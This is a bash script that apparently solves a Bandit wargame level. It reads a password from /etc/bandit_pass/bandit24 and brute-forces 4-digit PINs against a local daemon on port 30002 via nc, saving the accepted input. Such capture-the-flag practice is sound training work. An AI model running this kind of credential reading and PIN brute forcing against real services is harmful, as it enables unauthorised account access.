#! /bin/bash

count=$1
i=$count
limit=$(( count + 100 ))
pass_bandit24=$(cat /etc/bandit_pass/bandit24)
answer=""

mkdir -p ./tmp

while [[ $i -lt $limit && $done -eq 0 ]]
do
        echo $pass_bandit24 $(printf "%04d" $i) > ./tmp/b_pass$i
        answer=$(nc localhost 30002 < ./tmp/b_pass$i)
        grep -q Wrong <<< $answer
        if [ $? -ne 0 ];
        then
                echo $answer
		cat ./tmp/b_pass$i
		cp ./tmp/b_pass$i passwd.md
                done=1
        fi
        rm ./tmp/b_pass$i
        ((i++))
done

echo done $count to $limit

